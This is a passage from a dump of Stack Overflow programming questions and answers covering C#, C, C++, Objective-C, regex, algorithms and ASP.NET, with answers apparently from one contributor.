    //Import the extension method namespace.
    using nn;
    using nn_extension;
    class Program
    {
        static void Main(string[] args)
        {
            asdf.extension_testmethod();
        }
    }
}
</code></pre>

<p>any ideas?</p>
","33708","","<p>An extension method is a static method that behaves <strong>like an instance method for the type being extended</strong>, that is, you can call it on an instance of an object of type <code>asdf</code>. You can't call it as if it were a static method of the <em>extended</em> type.</p>

<p>Change your <code>Main</code> to:</p>

<pre><code>asdf a = new asdf();
a.extension_testmethod();
</code></pre>

<p>Of course, you can always call like a simple, <code>static</code>, non-extension method of the <em>declaring</em> type (<code>asdf_extension</code>):</p>

<pre><code>asdf_extension.extension_testmethod(null);
</code></pre>
"
"<p>Is this a CLR restriction or a language design decision? I tried to do it in C++/CLI, of course where it works because the need to support native c++:</p>

<pre><code>public ref class Test
    {
    	public:
    	static Test^ operator &amp;( Test^ msg, int&amp; i )
    	{
    		i = i + 1;

    		return nullptr;
    	} 
    };
</code></pre>

<p>and then looked at the compiler omitted output:</p>

<pre><code>public: static Test __gc* op_BitwiseAnd(Test __gc* msg, Int32 __gc** modopt(IsImplicitlyDereferenced __gc*) i)
{
    i[0] += 1;
    return 0;
}
</code></pre>

<p>I went further and tried to call this operator from C# project - and of course I needed to go [unsafe] to do it( I needed pointer ):</p>

<pre><code>Test t = new Test();
int i = 0;

unsafe
{
    t = t &amp; &amp;i;
}
</code></pre>

<p>Obviously not so hard to implement for the CLR? I really miss pass by reference in operators overloading and would like to at least in light myself in why is this missing? </p>

<p>Why can't C# hide the ugliness behind the unsafe and pointers when we need to deal with reference variables in our operator overloads? Even if I chose to go with this ugly workaround it wouldn't work in Silverlight, where unsafe operations is not allowed...</p>
","33708","","<p>In C#, your variables are never altered by callees without you explicitly passing them as references (e.g. <code>int.TryParse(s, out i)</code> where you explicitly specify the <code>out</code> keyword). This feature would make things complicated by allowing the overloaded operator alter the contents of the operands without your explicit permission.</p>

<p>For instance,</p>

<pre><code>public static MyStruct operator + (ref MyStruct left, ref MyStruct right) {
    left = new MyStruct(); // !!!!!!!!
    return something(left, right);
}
</code></pre>

<p>When you reference such an operator in C#:</p>

<pre><code>MyStruct x = new MyStruct();
MyStruct y = new MyStruct();
MyStruct z = x + y; // in C#, you never expect `x` to be changed.
</code></pre>
"
"<p>I had a quick function to format a date, here it is:</p>

<pre><code>public static string archiveServerDateTime(string datetime)
    {
        DateTime tempDateTime = DateTime.ParseExact(datetime,""dd.MM.yyyy HH:mm:ss"", null);
        return tempDateTime.ToString(""yyyy/MM/dd:HH:mm:ss"");
    }
</code></pre>

<p>only to find the output of the function = 2009.10.22:16:21:03, and amazingly this is only on 1 production server, test server worked perfectly fine......</p>

<p>So now I rewrote the function to old school style:</p>

<pre><code>public static string archiveServerDateTime(string datetime)
    {
        DateTime tempDateTime = DateTime.ParseExact(datetime,""dd.MM.yyyy HH:mm:ss"", null);
        string yearPart = Convert.ToString(tempDateTime.Year);
        string monthPart = Convert.ToString(tempDateTime.Month).PadLeft(2,'0');
        string dayPart = Convert.ToString(tempDateTime.Day ).PadLeft(2, '0');
        string hourPart = Convert.ToString(tempDateTime.Hour).PadLeft(2, '0');
        string minutePart = Convert.ToString(tempDateTime.Minute).PadLeft(2, '0'); 
        string secondPart = Convert.ToString(tempDateTime.Second).PadLeft(2,'0');

        return yearPart + @""/"" + monthPart + @""/"" + dayPart + "":"" + hourPart + "":"" + minutePart + "":"" + secondPart; 
        //return tempDateTime.ToString(""yyyy/MM/dd:HH:mm:ss"");
    }
</code></pre>

<p>So I ask you ladies and gentlemen, was I replacing perfectly good code to begin with, or is this a Microsoft bug of some kind? Can we really trust these new language features that are seemingly not so rock solid, or am I just missing something?</p>
","33708","","<p>You should pass <code>DateTimeFormatInfo.InvariantInfo</code> as an argument to the <code>DateTime.ToString</code> method. <code>/</code> in the format string does <strong>not</strong> mean <code>""/""</code> character all the time. It resolves to the date separator of the current culture:</p>

<pre><code>return tempDateTime.ToString(""yyyy/MM/dd:HH:mm:ss"", DateTimeFormatInfo.InvariantInfo);
</code></pre>

<p>In general, it's a good practice to always clearly specify the culture in <code>ToString</code> and <code>Parse</code> methods (not only on <code>DateTime</code>s). FxCop (VS Code Analysis) has rules that spit out warnings when you don't do this. It's critical for non-US cultures and the importance is often underestimated by many programmers. </p>
"
"<p>Suppose I want to have an inheritance hierarchy like this.</p>

<pre><code>class Base

class DerivedOne : public Base

class DerivedTwo : public Base
</code></pre>

<p>The base class is not meant to be instantiated, and thus has some pure virtual functions that the derived classes must define, making it an abstract base class.</p>

<p>However, there are some functions that you would like your derived classes to get from your base class. These functions modify private data members that both <em>DerivedOne</em> and <em>DerivedTwo</em> will have.</p>

<pre><code>class Base {
public:
      virtual void MustDefine() =0; // Function that derived classes must define
      void UseThis(); // Function that derived classes are meant to use
};
</code></pre>

<p>However, the <code>UseThis()</code> function is meant to modify private data members. That's where the question comes in. Should I give the <em>Base</em> class dummy private data members? Should I give it protected data members (and thus the derived classes won't declare their own private data members). I know the second approach will decrease encapsulation.</p>

<p>What is the best approach to a situation like this? If a more detailed explanation is needed I'd be happy to provide it.</p>
","33708","","<p>If those member variables are supposed to exist in <em>all</em> derived classes then you should declare them in the base class. If you are worried about encapsulation, you can make them <code>private</code> and provide <code>protected</code> accessor methods for derived classes. </p>
"
"<p>For me, it just seems like a funky MOV. What's its purpose and when should I use it?</p>
","33708","","<p><code>lea</code> is an abbreviation of ""load effective address"". It loads the address of the location reference by the source operand to the destination operand. For instance, you could use it to:</p>

<pre><code>lea ebx, [ebx+eax*8]
</code></pre>

<p>to move <code>ebx</code> pointer <code>eax</code> items further (in a 64-bit/element array) with a single instruction. Basically, you benefit from complex addressing modes supported by x86 architecture to manipulate pointers efficiently.</p>
"
"<p>I don't want to do anything fancy, I just want to make sure a document is valid, and print an error message if it is not. Google pointed me to <a href=""http://support.microsoft.com/kb/307379"" rel=""nofollow"">this</a>, but it seems XmlValidatingReader is obsolete (at least, that's what MonoDevelop tells me).</p>

<p>Edit: I'm trying Mehrdad's tip, but I'm having trouble. I think I've got most of it, but I can't find OnValidationEvent anywhere. Where go I get OnValidationEvent from?</p>

<pre><code>XmlReaderSettings settings = new XmlReaderSettings();
settings.ValidationType = ValidationType.DTD;
settings.ValidationEventHandler += new ValidationEventHandler(/*trouble is here*/);
XmlReader validatingReader = XmlReader.Create(fileToLoad, settings);
</code></pre>
","33708","","<p>Instead of creating <a href=""http://msdn.microsoft.com/en-us/library/system.xml.xmlvalidatingreader.aspx"" rel=""nofollow""><code>XmlValidatingReader</code> class</a> directly, you should construct an appropriate <a href=""http://msdn.microsoft.com/en-us/library/system.xml.xmlreadersettings.aspx"" rel=""nofollow""><code>XmlReaderSettings</code> object</a> and pass it as an argument to the <a href=""http://msdn.microsoft.com/en-us/library/ms162474.aspx"" rel=""nofollow""><code>XmlReader.Create</code> method</a>:</p>

<pre><code>var settings = new XmlReaderSettings { ValidationType = ValidationType.DTD };
settings.ValidationEventHandler += new ValidationEventHandler(OnValidationEvent);
var reader = XmlReader.Create(""file.xml"", settings);
</code></pre>

<p>The rest is unchanged.</p>

<p>P.S. <code>OnValidationEvent</code> is the name of the method you declare to handle validation events. Obviously, you can remove the line if you don't want to subscribe to validation events raised by the <code>XmlReader</code>.</p>
"
"<p>My web service program is supposed to generate a random code and return it to the client program. Right now it returns """" as the code instead of the randomly generated code. What is wrong with my variable scopes? Thanks.</p>

<pre><code>public class Service1 : System.Web.Services.WebService
{
    private string code = """";

    [WebMethod]
    public void StartGame()
    {
        // Pick a secret code
        // R, B, G, O, T, W, P, Y
        Random random = new Random();
        for (int i = 0; i &lt; 4; i++)
        {
            int num = random.Next(8) + 1;
            if (num == 1)
                this.code += ""R"";
            else if (num == 2)
                this.code += ""B"";
            else if (num == 3)
                this.code += ""G"";
            else if (num == 4)
                this.code += ""O"";
            else if (num == 5)
                this.code += ""T"";
            else if (num == 6)
                this.code += ""W"";
            else if (num == 7)
                code += ""P"";
            else if (num == 8)
                this.code += ""Y"";
        }
    }

    [WebMethod]
    public string MakeGuess(string guess)
    {
        return this.code;
    }
}
</code></pre>
","33708","","<p>The problem is those methods get called on two separate instances of the class. Each method is invoked once on a new instance of the class as an HTTP request comes in and the class will be thrown away. The server will have no idea that those requests are related in some way due to the stateless nature of HTTP protocol. </p>
"
"<p>I search for a programming language for which a compiler exists and that supports self modifying code. Iâve heared that Lisp supports these features, but I was wondering if there is a more C/C++/D-Like language with these features.</p>

<p>To clarify what I mean:</p>

<p>I want to be able to have in some way access to the programms code at runtime and apply any kind of changes to it, that is, removing commands, adding commands, changing them.
As if i had the AstTree of my programm. Of course i canât have that tree in a compiled language, so it must be done different. The compile would need to translate the self-modifying commands into their binary equivalent modifications so they would work in runtime with the compiled code.</p>

<p>I donât want to be dependent on an VM, thats what i meant with compiled :)</p>
","33708","","<p>""Dynamic language"" is a broad term that covers a wide variety of concepts. Dynamic typing is supported by C# 4.0 which is a compiled language. Objective-C also supports some features of dynamic languages. However, none of them are even close to Lisp in terms of supporting self modifying code.</p>

<p>To support such a degree of dynamism and self-modifying code, you should have a full-featured compiler to call at run time; this is pretty much what an interpreter really is.</p>
"
"<p>If I set a mutable string's value to a value from an array, and use the following code to manipulate it: </p>

<pre><code>NSMutableString *theCountry = [listItems objectAtIndex:3];
theCountry = [theCountry stringByReplacingOccurrencesOfString:@""\"""" withString:@""""];
</code></pre>

<p>I receive the warning ""warning: assignment from distinct Objective-C type"" after the second line of the above code. If I do not have ""theCountry ="" before the method call, the warning goes away, but the string does not get manipulated...</p>
","33708","","<p>The <code>stringByReplacingOccurrencesOfString:withString:</code> method is declared to return an <code>NSString*</code>, not an <code>NSMutableString*</code>. Basically, in the assignment, you're assigning an <code>NSString*</code> to a variable of type <code>NSMutableString*</code> which is not necessarily safe (note that <code>NSMutableString</code> inherits <code>NSString</code>, not the other way around).</p>
"
"<p>I just noticed that given the following code:</p>

<pre><code>if (x.ID &gt; 0 &amp;&amp; !x.IsCool)
</code></pre>

<p>the Microsoft C# 3.0 (VS2008 SP1) compiler will optimize it to this:</p>

<pre><code>if (!((x.Id &lt;= 0) || x. IsCool))
</code></pre>

<p>This is on Debug build <em>without</em> Optimization enabled. Why does the compiler do that? Is it faster in terms of execution?</p>

<p>I used Reflector to find that out (I was actually looking for something different)</p>
","33708","","<p>The C# compiler certainly <strong>does not generate an equivalent C# code for your snippet</strong>. It's compiled down to IL. Basically, what you are seeing (from Reflector, I guess) is the equivalent C# code that a <strong>decompiler</strong> spits out for that IL. </p>

<ol>
<li><p>The language specification does not say what an ""unoptimized"" code is. The C# compiler is allowed to generate any valid, functionally equivalent code. Even without optimization switch on, the compiler might do basic optimizations. Beside that, you can't say <em>what is <strong>natural</strong> for the compiler</em> and <em>whether the compiler deliberately optimized it or not</em>.</p></li>
<li><p>The <code>if</code> statement as a whole is evaluated as a sequence of conditional branches based on the values of each individual expression specified in the ""and"" clause. The expression is <em>not</em> evaluated in a single code block with ""and"" instructions. The output of the decompiler is something inferred from those branches. The decompiler cannot always infer the original expression you wrote. It just outputs something equivalent. </p></li>
</ol>

<p>Similarly, the difference between this snippet:</p>

<pre><code>if (a) { something(); }
else { somethingElse(); }
</code></pre>

<p>and this snippet:</p>

<pre><code>if (!a) { somethingElse(); }
else { something(); }
</code></pre>

<p>is not something you'd distinguish by seeing the compiled code.</p>
"
"<p>I need to determine whether or not two sets contains exactly the same elements. The ordering does not matter.</p>

<p>For instance, these two arrays should be considered equal:</p>

<pre><code>IEnumerable&lt;int&gt; data = new []{ 3,5,6,9 };
IEnumerable&lt;int&gt; otherData = new []{ 6,5,9,3}
</code></pre>

<p>One set cannot contain any elements, that are not in the other. </p>

<p>Can this be done using the built-in query operators ? And what would be the most efficient way to implement it, considering that the number of elements could range from a few to hundreds ?</p>
","33708","","<p>If you want to treat the arrays as ""sets"" and ignore order and duplicate items, you can use <a href=""http://msdn.microsoft.com/en-us/library/bb346516.aspx"" rel=""nofollow""><code>HashSet&lt;T&gt;.SetEquals</code> method</a>:</p>

<pre><code>var isEqual = new HashSet&lt;int&gt;(first).SetEquals(second);
</code></pre>

<p>Otherwise, your best bet is probably sorting both sequences in the same way and using <code>SequenceEqual</code> to compare them.</p>
"
"<p>First of all, I think this question is not C# independent. But can also be used in other languages like C.</p>

<p><hr></p>

<p>I'm now trying to parse a file format which stores integers in 4 bytes little-endian format.
TBH, I don't know how the little-endian format nor big-endian format works.</p>

<p>But I need to convert them into an usable int variable.</p>

<p>For example,
02 00 00 00 = 2</p>

<p>So far, I have this code to convert the first 2 bytes: (I used FileStream.Read to store the raw datas into a buffer variable)</p>

<pre><code>        int num = ((buffer[5] &lt;&lt; 8) + buffer[4]);
</code></pre>

<p>But it will only convert the first two bytes. (02 00 in the example, not 02 00 00 00)</p>

<p>Any kind of help would be appreciated :)</p>
","33708","","<pre><code>int GetBigEndianIntegerFromByteArray(byte[] data, int startIndex) {
    return (data[startIndex] &lt;&lt; 24)
         | (data[startIndex + 1] &lt;&lt; 16)
         | (data[startIndex + 2] &lt;&lt; 8)
         | data[startIndex + 3];
}

int GetLittleEndianIntegerFromByteArray(byte[] data, int startIndex) {
    return (data[startIndex + 3] &lt;&lt; 24)
         | (data[startIndex + 2] &lt;&lt; 16)
         | (data[startIndex + 1] &lt;&lt; 8)
         | data[startIndex];
}
</code></pre>
"
"<p>In:</p>

<pre><code>struct foo {
  unsigned bar : 2;
};
</code></pre>

<p>What does the ': 2' do?</p>
","33708","","<p>It declares a <a href=""http://msdn.microsoft.com/en-us/library/ewwyfdbe%28VS.80%29.aspx"" rel=""nofollow""><em>bit field</em></a>. The number specifies the size of that member in bits.</p>
"
"<p>I'm a beginner with C programming, but I was wondering what the difference was between the using typedef when defining a structure versus not using typedef. It seems to my like there's really no difference, they accomplish the same.</p>

<pre><code>struct myStruct{
    int one;
    int two;
};
</code></pre>

<p>vs.</p>

<pre><code>typedef struct{
    int one;
    int two;
}myStruct;
</code></pre>
","33708","","<p>In C (not C++), you have to declare struct variables like:</p>

<pre><code>struct myStruct myVariable;
</code></pre>

<p>In order to be able to use <code>myStruct myVariable;</code> instead, you can <code>typedef</code> the struct:</p>

<pre><code>typedef struct myStruct someStruct;
someStruct myVariable;
</code></pre>

<p>You can combine <code>struct</code> definition and <code>typedef</code>s it in a single statement which declares an anonymous <code>struct</code> and <code>typedef</code>s it.</p>

<pre><code>typedef struct { ... } myStruct;
</code></pre>
"
"<p>What is the advantage of using <a href=""http://en.wikipedia.org/wiki/Base64"">Base64</a> encode?</p>

<p>I would like to understand it better. Do I really need it? Can't I simply use pure strings?</p>

<p>I heard that the encoding can be up to 30% larger than the original (at least for images).</p>
","33708","","<p>The primary use case of base64 encoding is when you want to store or transfer data with a restricted set of characters; i.e. when you can't pass an arbitrary value in each byte.</p>
"
"<p>I have 2 separate List and I need to compare the two and get everything <em>but</em> the intersection of the two lists.  How can I do this (C#)?</p>
","33708","","<p>If you mean the set of everything but the intersection (symmetric difference) you can try:</p>

<pre><code>var set = new HashSet&lt;Type&gt;(list1);
set.SymmetricExceptWith(list2);
</code></pre>
"
"<p>Can anyone explain why this is happening?
ie. Even when 175 is present in the array at location 7, the array.binarysearch is returning a negative value?</p>

<p>Please see this image:</p>

<p><img src=""http://www.freeimagehosting.net/uploads/555fef4560.jpg"" alt=""Code"" title=""""></p>
","33708","","<p>Did you sort your array beforehand? <code>BinarySearch</code> expects the array to be sorted. Otherwise, it may return incorrect results.</p>

<p>Also, you should check for <code>&gt;= 0</code>, not <code>&gt; 0</code>. The element can be present at index 0.</p>
"
"<pre><code>My Team use ---&gt;     aa.GetItem()       --&gt;&gt; result
</code></pre>

<p>After create <code>NewGetItem</code> extension function. don't use <code>GetItem</code>. <code>GetItem</code> must be <code>obsolete</code></p>

<pre><code>My Team use ---&gt; â    aa.GetItem()       â --&gt;&gt; new result
                 â                       â
                 â--&gt; aa.NewGetItem() --&gt;â
</code></pre>

<p>i don't have <code>aa</code> class code. </p>

<p>How to do it?</p>

<p>Is it possible?</p>
","33708","","<p>No, the attribute should be applied directly to the method you want to mark as obsolete.</p>
"
"<p>Given a directed, connected graph with only positive edge weights, are there faster algorithms for finding the shortest path between two vertices, than Dijkstra using a fibonacci heap?</p>

<p>Wikipedia says, that Dijkstra is in O(|E| + |V| * log(|V|)) (using a fibonacci heap).</p>

<p>I'm not looking for optimizations that, for example, half the execution time, but rather algorithms that are in a different time complexity (like going from O(n * log n) to O(n)).</p>

<p>Further, I would like to know your opinion on the following approach:</p>

<ol>
<li>Determine the GCD of all edge weights.</li>
<li>Transform the graph into a graph with uniform edge weights.</li>
<li>Use BFS to find the shortest path between two given vertices.</li>
</ol>

<p><em>Example for point 2:</em><br/>
Imagine the GCD to be 1. Then I would transform the edge<br/>
A--->B (edge weight 3)<br/>
into<br/>
A->A'->A''->B (3 times edge weight 1)<br/>
This transformation costs constant time and would have to be done once for every edge. So I expect this algorithm to be in O(|E|) (transformation) + O(|E| + |V|) (BFS) = O(2 * |E| + |V|) = O(|E| + |V|)</p>

<p>Thanks for taking the time to read my question and I hope not having waisted your time^^. Have a nice day.</p>
","33708","","<p>The big oh analysis you did for your algorithm is deeply flawed. Assume all edges are prime numbers. The number of edges in the new graph will be equal to sum of all weights. Thus <code>O(|E| + |V|)</code> of the <strong>new</strong> graph is actually <code>O(W x |E| + |V|)</code> in the original graph which can be much larger than <code>O(|E| + |V| log |V|)</code>.</p>
"
"<p>I have an ASP.NET web application and I want to be able to take items from a master list and store them temporarliy into one of four other lists. The 'other' lists need to survive post backs so that more items can be added to them. What direction would you suggest going with? </p>

<p>I have thought of using a generic list stored in memory, temporarliy storing the items into the database and calling them back on PostBack, or storing them into the viewstate, but I have a feeling that there is some solution that I'm missing that might be easier or better. </p>
","33708","","<p>The first thing I would suggest is to see if you can remove the need of keeping state across postbacks. </p>

<p>If you can't do so (and <code>ViewState</code> is not applicable for some reason like bandwidth limitations or requiring data preservation even without a postback from a server form), I suggest consider using <code>Session</code>. You can configure session state to use a SQL Server database backend whenever you want without worrying about changing source code.</p>
"
"<p>I have the following code </p>

<pre><code>@implementation UIDevice(machine)

- (NSString *)machine
{
  size_t size;

  // Set 'oldp' parameter to NULL to get the size of the data
  // returned so we can allocate appropriate amount of space
  sysctlbyname(""hw.machine"", NULL, &amp;size, NULL, 0); 

  // Allocate the space to store name
  char *name = malloc(size);

  // Get the platform name
  sysctlbyname(""hw.machine"", name, &amp;size, NULL, 0);

  // Place name into a string
  NSString *machine = [NSString stringWithCString:name];

  // Done with this
  free(name);

  return machine;
}

@end

/* ... */

NSLog(@""device: %@"", [[UIDevice currentDevice] machine]);
</code></pre>

<p>I am getting the output as:</p>

<pre><code>Platforms:
-----------
iPhone1,1 
iPhone1,2 
iPod1,1   
iPod2,1
</code></pre>

<p>what does the two numbers appended after the iphone/ipod touch signify i,e (1,1 ) , (1,2) etc ?</p>

<p>Thanks
Biranchi</p>
","33708","","<p><strong>iPhone1,1</strong>: iPhone (original)<br>
<strong>iPhone1,2</strong>: iPhone 3G<br>
<strong>iPhone2,1</strong>: iPhone 3GS<br>
<strong>iPhone3,1</strong>: iPhone 4<br>
<strong>iPhone4,1</strong>: iPhone 4S</p>

<p><strong>iPod1,1</strong>: iPod touch (original)<br>
<strong>iPod2,1</strong>: iPod touch (2nd generation)<br>
<strong>iPod3,1</strong>: iPod touch (3rd generation)<br>
<strong>iPod4,1</strong>: iPod touch (4th generation)</p>

<p><strong>iPad1,1</strong>: iPad (original)<br>
<strong>iPad2,1</strong>: iPad 2<br>
<strong>iPad3,1</strong>: iPad (3rd generation)</p>
"
"<pre><code>procedure max (a[1..n]: integers)
    max := a[1]
    for i := 2 to n
        if max &lt; a[i] then max := a[i]
</code></pre>

<p>Is the complexity <code>O(1)</code> or <code>O(n)</code> with the best case scenario? The sequence contains <code>n</code> elements. It is pseudocode.</p>
","33708","","<p>There's no difference between the best case and worst case asymptotic running times for this algorithm. In all cases, you have to traverse the whole array (<code>n</code> elements) and your algorithm would be O(n).</p>

<p>Theoretically, there's no way you can find the maximum element of an arbitrary array in less than O(n) since you should always visit each element at least once.</p>
"
"<p>I need to be able to extract a string between 2 tags for example: ""00002"" from ""<code>morenonxmldata&lt;tag1&gt;0002&lt;/tag1&gt;morenonxmldata</code>""</p>

<p>In using C# and .NET 3.5.</p>
","33708","","<p>A <code>RegEx</code>-free solution:</p>

<pre><code>string ExtractString(string s, string tag) {
     // You should check for errors in real-world code, omitted for brevity
     var startTag = ""&lt;"" + tag + ""&gt;"";
     int startIndex = s.IndexOf(startTag) + startTag.Length;
     int endIndex = s.IndexOf(""&lt;/"" + tag + ""&gt;"", startIndex);
     return s.Substring(startIndex, endIndex - startIndex);
}
</code></pre>
"
"<p>Why does "".*"" and "".+"" give different results?</p>

<pre><code>System.out.println(""foo"".replaceAll("".+"", ""bar"")); // --&gt; ""bar""
System.out.println(""foo"".replaceAll("".*"", ""bar"")); //--&gt; ""barbar""
</code></pre>

<p>I would expect ""bar"" for both, since * and + are both greedy and should match the whole String. (The above example is Java, but other Tools, like <a href=""http://www.gskinner.com/RegExr/"">http://www.gskinner.com/RegExr/</a> give me the same result)</p>
","33708","","<p>You're right about both being greedy but <code>"".*""</code> is matching <strong>two</strong> strings: the first one is <code>""foo""</code> and the second is <code>""""</code>. <code>"".+""</code> will only match <code>""foo""</code>.</p>

<p>Both try to match the longest possible string which is <code>""foo""</code>. After that, they try to find the longest matching string coming after the previous match. In this phase, <code>"".*""</code> is able to match an empty string while <code>"".+""</code> won't.</p>
"
"<p>I'm missing a trick here I think and can't believe I've never done this before. However, how can I cast a generic type using the as keyword?</p>

<pre><code>[Serializable]
public abstract class SessionManager&lt;T&gt; where T : ISessionManager
{

    protected SessionManager() { }

    public static T GetInstance(HttpSessionState session)
    {

        // Ensure there is a session Id
        if (UniqueId == null)
        {
            UniqueId = Guid.NewGuid().ToString();
        }

        // Get the object from session
        T manager = session[UniqueId] as T;
        if (manager == null)
        {
            manager = Activator.CreateInstance&lt;T&gt;();
            session[UniqueId] = manager;
        }

        return manager;

    }

    protected static string UniqueId = null;

}
</code></pre>

<p>The line <code>T manager = session[UniqueId] as T;</code> throws the following error:</p>

<blockquote>
  <p>The type parameter 'T' cannot be used
  with the 'as' operator because it does
  not have a class type constraint nor a
  'class' constraint</p>
</blockquote>

<p>Now, I think understand the reason for this; I've not physically told the compiler that T is a class. If I replace:</p>

<pre><code>public abstract class SessionManager&lt;T&gt; where T : ISessionManager
</code></pre>

<p>with</p>

<pre><code>public abstract class SessionManager&lt;T&gt; where T : class
</code></pre>

<p>... then the code builds successfully.</p>

<p>But my question is thus; how can I have both the class and ISessionManager enforcements on the generic type? I'm hoping there's a very simple answer for this.</p>

<p><strong>EDIT:</strong>
Just to add I had tried: <code>where T : ISessionManager, class</code>, turns out I hadn't read my compiler error properly. Simply enough, just putting class before <code>ISessionManager</code> fixes the issue. The error I hadn't read was:</p>

<blockquote>
  <p>""The 'class' or 'struct' constraint
  must come before any other
  constraints"". </p>
</blockquote>

<p>Dumb moment over.</p>
","33708","","<pre><code>... where T : class, ISessionManager
</code></pre>
"
"<p>Given the following classes:</p>

<pre><code>ClassA
{
     public ClassA DoSomethingAndReturnNewObject()
     {}    
}

ClassB : ClassA
{}

ClassC : ClassA
{}
</code></pre>

<p>Is there a way to get <code>ClassB</code> and <code>ClassC</code> to inherit the method but customize the return type to their own class?</p>

<p>I prefer not to copy the method from ClassA and change the type there. </p>

<p>I need to get a <code>ClassB</code> object when I call <code>ClassB.DoSomethingAndReturnNewObject()</code>.</p>

<p>I need to get a <code>ClassC</code> object when I call <code>ClassC.DoSomethingAndReturnNewObject()</code>.</p>

<p>Something like calling a constructor based on current type like: <code>this.GetType()</code>? But I have no clue how to actually do that.</p>
","33708","","<p>No, the feature you mentioned is called <a href=""http://en.wikipedia.org/wiki/Covariant%5Freturn%5Ftype"" rel=""nofollow""><strong>return type covariance</strong></a>. It's not supported in C#.</p>
"
"<p>In c# 4.0, are dynamic method parameters possible, like in the following code?</p>

<pre><code>public string MakeItQuack(dynamic duck)
{
  string quack = duck.Quack();
  return quack;
}
</code></pre>

<p>I've many cool examples of the dynamic keyword in C# 4.0, but not like above. This question is of course inspired by how python works.</p>
","33708","","<p>Yes, you can do that. As stated in C# 4.0 specification, the grammar is extended to support <code>dynamic</code> wherever a <em>type</em> is expected:</p>

<blockquote>
  <p><em>type</em>:<br>
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;     ...<br>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;      <code>dynamic</code></p>
</blockquote>

<p>This includes parameter definitions, of course.</p>
"
"<p>I'm learning to write custom type conversions in C# and I have a question I can't manage to resolve with Google / MSDN / earlier posted SO items.</p>

<p>Normally, a C# program that narrows a numeric type does that via unchecked explicit conversion, e.g.:</p>

<pre><code>int i = 256;
byte b = (byte)i; // b == 0
</code></pre>

<p>however, the following will give an overflow exception:</p>

<pre><code>byte b = checked((byte)i);
</code></pre>

<p>My question is as follows: is the behavior of the checked / unchecked keyword implementable in an custom type conversion, e.g.:</p>

<pre><code>class Foo {
  public static explicit operator int(Foo bar) {
    if (checked)
      throw someEception
    else
      return some Foo to int conversion
  }
}
</code></pre>

<p>Of course, the code above is not the answer, but does anyone know if something like this is possible?</p>
","33708","","<p><code>checked</code> is a compile time thing. That is, its sole effect will be on the code block <strong>directly</strong> surrounded by a <code>checked</code> statement, not the methods called in that block. Consequently, there wouldn't be a <code>checked</code> and <code>unchecked</code> context at run time that you may want to adjust the behavior of a function according to it.</p>
"
"<p>I have the following static method inside a static class. My question is it safe to use HttpContext.Current.Response inside a static method? I want to be 100% sure that it is thread safe and is only associated with the calling thread.. Does anybody know the answer?</p>

<pre><code>	public static void SetCookie(string cookieName, string cookieVal, System.TimeSpan ts)
	{
		try
		{
			HttpCookie cookie = 
				new HttpCookie(CookiePrefix + cookieName) 
					{Value = cookieVal, Expires = DateTime.Now.Add(ts)};
			HttpContext.Current.Response.Cookies.Add(cookie);
		}
		catch (Exception)
		{
			return;
		}
	}
</code></pre>
","33708","","<p>It's not clear what do you exactly mean by thread-safety. Yes, <code>HttpContext.Current</code> returns the <code>HttpContext</code> object associated with the current thread. Note that if you call the function on a thread except the one currently processing the request (for example, in an async function call), you wouldn't be able to access the <code>HttpContext</code> object you want. </p>

<p>Another approach is to have the context object passed as an argument to your function.</p>
"
"<p>Surely there is a framework method that given an array of integers, strings etc converts them into a list that can be used in a SQL ""<code>IN</code>"" clause?</p>

<p>e.g. </p>

<pre><code>int[] values = {1,2,3};
</code></pre>

<p>would go to</p>

<pre><code>""(1,2,3)""
</code></pre>
","33708","","<pre><code>var inClause = ""(""
     + String.Join("","", values.Select(x =&gt; x.ToString()).ToArray()) 
     + "")"";
</code></pre>

<p><em>Note</em>: You no longer need to call <code>.ToArray()</code> in .NET Framework 4. A new <a href=""http://msdn.microsoft.com/en-us/library/dd992421%28VS.100%29.aspx""><code>String.Join&lt;T&gt;(string separator, IEnumerable&lt;string&gt; values)</code></a> method is added.</p>
"
"<p>So i have a couple of custom Http Handlers for different file types. I have implemented the IRequiredSessionState marker, but still recieving context.Session as null?</p>

<p>Do you need to initialize the Session somehow?</p>
","33708","","<p>Have you enabled session in your <code>Web.config</code> file? No, you don't need to perform any particular initialization:</p>

<pre><code>&lt;sessionState mode=""InProc"" /&gt;
</code></pre>

<p>By the way, the interface name is <code>System.Web.SessionState.IRequiresSessionState</code>, not <code>IRequiredSessionState</code>. </p>
"
"<p>I use a string:</p>

<pre><code>char    word[100];
</code></pre>

<p>I add some chars to each position starting at 0.
But then I need be able to clear all those positions so that I can start add new characters starting at 0.</p>

<p>If I don't do that then if the second string is shorten then the first one I end up having extra characters from the first string when adding the second one since I don't overwrite them.</p>
","33708","","<p>If you want to zero out the whole array, you can:</p>

<pre><code>memset(word, 0, sizeof(word));
</code></pre>
"
"<p>I just heard that you should create an index on any column you're joining or querying on. If the criterion is this simple, why can't databases automatically create the indexes they need?</p>
","33708","","<p>Well, they do; to some extent at least... </p>

<p>See <a href=""http://msdn.microsoft.com/en-us/library/ms173494.aspx"" rel=""nofollow"">SQL Server Database Engine Tuning Advisor</a>, for instance.</p>

<p>However, creating optimal indexes is not as simple as you mentioned. An even simpler rule could be to create indexes on every column (which is far from optimal)! </p>

<p>Indexes are not free. You create indexes at the cost of storage and update performance among other things. They should be carefully thought about to be optimal.</p>
"
"<p>tl;dr: Is there a non-short circuit logical AND in C++ (similar to &amp;&amp;)?</p>

<p>I've got 2 functions that I want to call, and use the return values to figure out the return value of a 3rd composite function.  The issue is that I always want both functions to evaluate (as they output log information about the state of the system)</p>

<p>IE:</p>

<pre><code>bool Func1(int x, int y){
  if( x &gt; y){
    cout &lt;&lt; ""ERROR- X &gt; Y"" &lt;&lt; endl;
  }
}
bool Func2(int z, int q){
  if( q * 3 &lt; z){
    cout &lt;&lt; ""ERROR- Q &lt; Z/3"" &lt;&lt; endl;
  }
}
bool Func3(int x, int y, int z, int q){
  return ( Func1(x, y) &amp;&amp; Func2(z, q) );
}
</code></pre>

<p>Of course, the conditionals aren't quite that simple in the functions, and yes, I realize that I could use temporary variables to store the returns of the two functions and then do the ""short-circuit"" logic on the temporary variables, but I was wondering if there was an ""elegant"" language solution to keep the one-line return in Func3 while still getting the logging messages from both functions. </p>

<hr>

<p>Summary of responses:</p>

<p>The ""bitwise"" operators | and &amp; can be used to get the effect, but only if the return type is bool.  I found no mention of this in the ANSI C++ spec. From what I can tell, this works because the ""bool"" is converted to an int (true = 1, false = 0), and then the bitwise operator is used, then it is converted back to a bool.</p>

